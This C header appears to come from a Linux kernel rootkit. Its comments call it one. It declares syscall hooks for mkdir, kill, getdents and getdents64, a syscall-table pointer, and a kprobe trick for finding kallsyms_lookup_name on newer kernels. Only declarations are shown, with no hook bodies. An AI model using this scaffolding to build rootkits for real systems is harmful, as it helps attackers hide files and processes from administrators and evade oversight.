/*

BSD 3-Clause License

Copyright (c) 2021, Ch4r0nN λ
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

3. Neither the name of the copyright holder nor the names of its
   contributors may be used to endorse or promote products derived from
   this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

#include <linux/linkage.h>
#include <linux/dirent.h>

unsigned long cr0;
unsigned long *__syscall_table;
unsigned long __force_order;

enum NR_getdents{
	__NR_getdents = 141
}

asmlinkage int hook_mkdir(const struct pt_regs *regs);
//Hooking kill
asmlinkage int hook_kill(const struct pt_regs *regs);
/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
 * declare the orig_getdents64 and hook_getdents64 functions differently
 * depending on the kernel version. This is the larget barrier to
 * getting the rootkit to work on earlier kernel versions. The
 * more modern way is to use the pt_regs struct. */

asmlinkage int hook_getdents64(const struct pt_regs *regs);
asmlinkage int hook_getdents(const struct pt_regs *regs);

/* This is an old structure that isn't included in the kernel headers anymore 
 * so we have to declare it ourselves */

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[];
};

/*
 * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported, 
 * so we have to use kprobes to get the address.
 * Full credit to @f0lg0 for the idea.
 * And full credit to Harvey Phillips (xcellerator@gmx.com) for code that inspired me.
 */
#include <linux/kprobes.h>

unsigned long kln_addr;
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}
